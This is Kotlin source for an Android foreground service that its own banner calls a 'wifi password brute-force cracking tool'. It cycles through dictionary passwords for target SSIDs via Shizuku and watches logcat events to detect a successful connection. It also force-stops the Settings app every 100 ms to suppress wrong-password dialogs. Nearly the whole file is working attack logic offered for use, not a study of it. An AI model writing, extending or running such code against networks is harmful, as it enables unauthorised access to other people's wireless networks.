package com.wifi.toolbox.services

import android.app.*
import android.content.Intent
import android.content.SharedPreferences
import android.os.*
import androidx.compose.runtime.snapshotFlow
import androidx.core.app.NotificationCompat
import com.wifi.toolbox.*
import com.wifi.toolbox.structs.*
import com.wifi.toolbox.ui.MainActivity
import com.wifi.toolbox.utils.ShizukuUtil
import kotlinx.coroutines.*
import kotlin.coroutines.resume

class PojieService : Service() {

    val NOTIFICATION_CHANNEL_ID = "PojieServiceChannel"

    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    private var readLogMode = 0
    private var logcatService: WifiLogcatService? = null


    fun log(log: String) {
        (applicationContext as MyApplication).logState.addLog(log)
    }

    private lateinit var sharedPreferences: SharedPreferences

    private var _pojieSettings: PojieSettings? = null

    private val pojieSettings: PojieSettings
        get() = _pojieSettings ?: PojieSettings.from(sharedPreferences).also { _pojieSettings = it }

    private val prefsListener = SharedPreferences.OnSharedPreferenceChangeListener { prefs, _ ->
        _pojieSettings = PojieSettings.from(prefs)
    }

    override fun onCreate() {
        super.onCreate()
        sharedPreferences = getSharedPreferences("settings_pojie", MODE_PRIVATE)
        sharedPreferences.registerOnSharedPreferenceChangeListener(prefsListener)
    }

    fun stopAllTasks() {
        val app = applicationContext as MyApplication
        app.runningPojieTasks.clear()
        currentWorkerJob?.cancel()
    }

    private fun calculatePriority(task: PojieRunInfo): Long {
        val currentTime = System.currentTimeMillis()
        val timeDiff = currentTime - task.lastTryTime

        val priority = -timeDiff
        return priority
    }

    private suspend fun performTaskLogic(app: MyApplication, task: SinglePojieTask): Int {
        val startTime = System.currentTimeMillis()

        when (pojieSettings.connectMode) {
            0 -> throw Exception("连接wifi实现为空，请先去设置中选择")
            1 -> ShizukuUtil.connectToWifi(task.ssid, task.password)
            else -> throw Exception("前面的区域，以后再来探索吧(connectMode=${pojieSettings.connectMode})")
        }

        return withTimeoutOrNull(timeMillis = app.pojieConfig.maxTryTime.toLong()) {
            suspendCancellableCoroutine<Int> { continuation ->
                val collectJob = launch {
                    when (readLogMode) {
                        1 -> logcatService?.logFlow?.collect { data ->
                            if (continuation.isActive) {
                                if (data.ssid == task.ssid && data.eventStartTime >= startTime) {

                                    //log(data.toString())

                                    when (data.event) {
                                        WifiLogData.EVENT_WIFI_CONNECTED -> {
                                            continuation.resume(SinglePojieTask.RESULT_SUCCESS)
                                            cancel()
                                        }

                                        WifiLogData.EVENT_CONNECT_FAILED -> {
                                            if (System.currentTimeMillis() - data.eventStartTime > 2000) {
                                                continuation.resume(SinglePojieTask.RESULT_FAILED)
                                                cancel()
                                            }
                                        }

                                        WifiLogData.EVENT_HANDSHAKE -> {
                                            when (app.pojieConfig.failureFlag) {
                                                1 -> if (data.handshakeUseTime > app.pojieConfig.timeout) {
                                                    continuation.resume(SinglePojieTask.RESULT_FAILED)
                                                    cancel()
                                                }

                                                2 -> {
                                                    if (data.handshakeCount > app.pojieConfig.maxHandshakeCount) {
                                                        continuation.resume(SinglePojieTask.RESULT_FAILED)
                                                        cancel()
                                                    }
                                                }

                                            }
                                        }

                                        else -> {
                                            continuation.resume(SinglePojieTask.RESULT_ERROR)
                                            cancel()
                                        }
                                    }
                                } else {
                                    log("W: 信息不匹配")
                                }
                            }
                        }
                    }

                }

                continuation.invokeOnCancellation {
                    collectJob.cancel()
                }
            }
        } ?: SinglePojieTask.RESULT_TIMEOUT
    }

    private var currentWorkerJob: Job? = null

    @Volatile
    private var currentWorkingSsid: String? = null

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun getLogTime(): String {
        val df = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
        return "[${df.format(java.util.Date())}]"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val app = applicationContext as MyApplication
        try {
            createNotificationChannel()
            val notificationIntent = Intent(this, MainActivity::class.java).apply {
                putExtra("target", "Pojie")
            }
            val pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
            )

            val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("密码字典破解服务").setContentText("正在运行")
                .setSmallIcon(R.drawable.ic_launcher_foreground).setContentIntent(pendingIntent)
                .setOngoing(true).setPriority(NotificationCompat.PRIORITY_MIN).build()

            startForeground(1, notification)

            if (currentWorkerJob == null && currentWorkingSsid == null) {
                app.logState.clear()
                log(
                    log = """      _      __                 _        
     | |___ / _|_ __ ___  _   _| |_ __ _ 
  _  | / __| |_| '_ ` _ \| | | | __/ _` |
 | |_| \__ \  _| | | | | | |_| | || (_| |
  \___/|___/_| |_| |_| |_|\__, |\__\__, |
                          |___/    |___/ 
==========================================
wifi密码暴力破解工具 v3 for Android
"""
                )
                readLogMode = pojieSettings.readLogMode
                when (readLogMode) {
                    0 -> throw Exception("读取网络日志实现为空，请先去设置中选择")
                    1 -> {
                        logcatService = WifiLogcatService(pojieSettings)
                        log("Logcat服务已启动")
                    }

                    2 -> throw Exception("前面的区域，以后再来探索吧(readLogMode=2)")
                }
                startServiceLogic()
            }

            return START_STICKY
        } catch (e: Exception) {
            stopAllTasks()
            log("E: 服务启动失败")
            log(e.stackTraceToString())
            return START_NOT_STICKY
        }
    }

    private fun startServiceLogic() {
        val app = applicationContext as MyApplication

        serviceScope.launch {
            while (isActive) {
                //注：专门针对某些设备密码错误就不管什么页面都弹窗的反人类设计
                //但是运行期间打不开设置应用，所以TODO加个开关
                ShizukuUtil.executeCommandSync("am force-stop com.android.settings")
                delay(100)
            }
        }

        serviceScope.launch {
            launch {
                snapshotFlow { app.runningPojieTasks.toList() }.collect { currentList ->
                    val targetSsid = currentWorkingSsid
                    if (targetSsid != null) {
                        if (currentList.none { it.ssid == targetSsid }) {
                            currentWorkerJob?.cancel()
                        }
                    }
                }
            }

            while (isActive) {
                val tasks = app.runningPojieTasks

                if (tasks.isEmpty()) {
                    log("[运行结束]")
                    logcatService?.close()
                    stopSelf()
                    break
                }

                val task = tasks.minByOrNull { calculatePriority(it) }
                //TODO:异常重试等待时间
                if (task == null) {
                    delay(500)
                    continue
                }

                currentWorkingSsid = task.ssid
                val currentPass = task.tryList.getOrNull(task.tryIndex) ?: "未知"

                updateTaskState(app, task.ssid) {
                    it.copy(
                        status = PojieRunInfo.STATUS_RUNNING,
                        textTip = "正在尝试：$currentPass",
                        lastTryTime = System.currentTimeMillis()
                    )
                }

                var taskResult = -1

                currentWorkerJob = launch {
                    try {
                        taskResult = performTaskLogic(
                            app, SinglePojieTask(
                                ssid = task.ssid, password = currentPass
                            )
                        )
                    } catch (e: Exception) {
                        if (e !is CancellationException) {
                            log("E: 任务执行出错：${e.toString()}")
                        }
                        taskResult = SinglePojieTask.RESULT_ERROR
                    }
                }

                var timeTag = getLogTime()
                log("$timeTag 尝试: (${task.ssid}, $currentPass) ...")

                currentWorkerJob?.join()
                timeTag = getLogTime()
                if (currentWorkerJob?.isCancelled == true) {
                    app.logState.setLine("$timeTag 尝试: (${task.ssid}, $currentPass) 结果: 任务中断")
                    ShizukuUtil.disconnectWifi()
                } else {
                    app.logState.setLine("$timeTag 尝试: (${task.ssid}, $currentPass) 结果: $taskResult")
                    processTaskCompletion(app, task.ssid)
                    ShizukuUtil.disconnectWifi() //干完事情恢复原样可是好习惯
                }
                when (taskResult) {
                    SinglePojieTask.RESULT_SUCCESS -> {
                        log("连接成功: (${task.ssid}, $currentPass)")
                        app.stopTaskByName(task.ssid)
                    }

                    SinglePojieTask.RESULT_ERROR -> {
                        app.stopTaskByName(task.ssid)
                    }
                }

                currentWorkingSsid = null
                currentWorkerJob = null
            }
        }
    }

    private fun processTaskCompletion(app: MyApplication, ssid: String) {
        val currentTask = app.runningPojieTasks.find { it.ssid == ssid } ?: return
        val nextIndex = currentTask.tryIndex + 1

        if (nextIndex >= currentTask.tryList.size) {
            app.stopTaskByName(ssid)
        } else {
            updateTaskState(app, ssid) {
                it.copy(
                    tryIndex = nextIndex,
                    status = PojieRunInfo.STATUS_WAITING,
                    textTip = "排队中",
                    lastTryTime = System.currentTimeMillis()
                )
            }
        }
    }

    private fun updateTaskState(
        app: MyApplication, ssid: String, transform: (PojieRunInfo) -> PojieRunInfo
    ) {
        val index = app.runningPojieTasks.indexOfFirst { it.ssid == ssid }
        if (index != -1) {
            app.runningPojieTasks[index] = transform(app.runningPojieTasks[index])
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        sharedPreferences.unregisterOnSharedPreferenceChangeListener(prefsListener)
        stopForeground(STOP_FOREGROUND_REMOVE)
        serviceScope.cancel()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID, "密码字典破解服务", NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }
}